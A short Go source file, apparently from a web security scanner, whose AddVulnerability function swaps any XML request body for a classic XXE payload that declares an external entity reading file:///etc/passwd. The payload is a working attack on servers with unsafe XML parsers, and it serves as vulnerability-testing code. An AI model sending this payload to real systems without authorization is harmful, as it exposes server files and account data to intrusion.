package xxe

import (
	"bytes"
	"io"
	"net/http"
)

const kVulnerability = `
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <foo>&xxe;</foo>
`

func isXML(body []byte) bool {
	return bytes.HasPrefix(body, []byte("<?xml"))
}

func AddVulnerability(req *http.Request) error {
	body, err := io.ReadAll(req.Body)
	if err != nil {
		return err
	}

	if isXML(body) {
		body = []byte(kVulnerability)
	}

	req.Body = io.NopCloser(bytes.NewReader(body))
	return nil
}
